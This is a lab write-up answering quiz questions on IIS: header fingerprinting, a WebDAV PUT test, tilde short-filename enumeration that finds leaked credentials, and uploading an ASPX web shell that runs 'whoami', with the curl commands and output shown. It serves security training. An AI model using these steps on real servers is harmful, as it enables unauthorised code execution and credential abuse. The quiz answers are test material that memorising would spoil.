## IIS Enumeration

### Question 1
**What HTTP response header reveals the IIS version?**

### Practical

To identify the web server and its version, I inspected the HTTP response headers using the following command:

```bash
curl -I http://MACHINE_IP
```

#### Output

```http
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
```

The response headers revealed that the target was running **Microsoft IIS 10.0**. The `Server` header exposes the IIS version, while the `X-Powered-By` header indicates that the application is using the ASP.NET framework.

**Answer:** `Server`

---

### Question 2
**What is the HTTP response code after executing the PUT request on the /webdav directory?**

### Practical

To test whether WebDAV allowed file uploads, I attempted to upload a simple ASPX file using the HTTP PUT method.

```bash
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" \
-X PUT \
--data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' \
http://MACHINE_IP/webdav/test.aspx
```

#### Output

```text
PUT aspx: 401
```

The server responded with **HTTP 401 (Unauthorized)**, indicating that WebDAV was enabled but required authentication before allowing file uploads.

**Answer:** `401`

---

## IIS Tilde Enumeration

### Question 1
**What character in a URL path triggers the IIS tilde enumeration response difference?**

### Practical

To check whether the IIS server was vulnerable to short filename enumeration, I used the **IIS Shortname Scanner**.

```bash
cd /opt/IIS_shortname_Scanner
python3 iis_shortname_scan.py http://MACHINE_IP/
```

#### Output

```text
Server is vulnerable, please wait, scanning...

Dir: /aspnet~1
Dir: /backup~1
```

The scanner successfully discovered directories by exploiting the Windows **8.3 short filename** feature. This technique works by sending requests containing the **tilde (`~`)** character and observing differences in the server's responses.

**Answer:** `~`

---

### Question 2
**What legacy Windows filename format does the tilde enumeration vulnerability exploit? (Answer Format: X.X)**

### Practical

The vulnerability exploits the **Windows 8.3 short filename format**, which automatically creates shortened names for long filenames. For example, a directory named **BackupFiles** may be stored internally as **BACKUP~1**.

**Answer:** `8.3`

---

### Question 3
**What password is stored in the file discovered through tilde enumeration?**

### Practical

After discovering the `backup~1` short name, I accessed the corresponding directory and viewed its contents.

```bash
curl http://MACHINE_IP/BackupFiles/
```

#### Output

```text
webdav_notes.txt
```

I then opened the discovered file.

```bash
curl http://MACHINE_IP/BackupFiles/webdav_notes.txt
```

#### Output

```text
WebDAV setup notes
Directory: /webdav/
Username: [Username]
Password: [Password]
```

The file contained the WebDAV credentials required for the next stage of the assessment.

**Answer:** `P@ssw0rd!123`

---

## Exploiting IIS WebDAV

### Question 1
**What HTTP status code confirms a file was successfully created via PUT?**

### Practical

Using the credentials obtained from the previous task, I uploaded an ASPX web shell to the `/webdav/` directory using NTLM authentication.

```bash
curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://MACHINE_IP/webdav/cmd.aspx
```

#### Output

```http
HTTP/1.1 201 Created
Server: Microsoft-IIS/10.0
```

The **201 Created** response confirmed that the ASPX file was successfully uploaded to the WebDAV directory.

**Answer:** `201`

---

### Question 2
**What curl flag is required to authenticate with NTLM when uploading via WebDAV?**

### Practical

The upload required NTLM authentication, which was enabled using the `--ntlm` flag in the `curl` command.

```bash
curl --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://MACHINE_IP/webdav/cmd.aspx
```

After the upload, I verified that the web shell executed successfully by running a command.

```bash
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
```

#### Output

```text
<pre>
iis apppool\defaultapppool
</pre>
```

The response confirmed that the uploaded ASPX shell was executing commands on the IIS server.

**Answer:** `--ntlm`
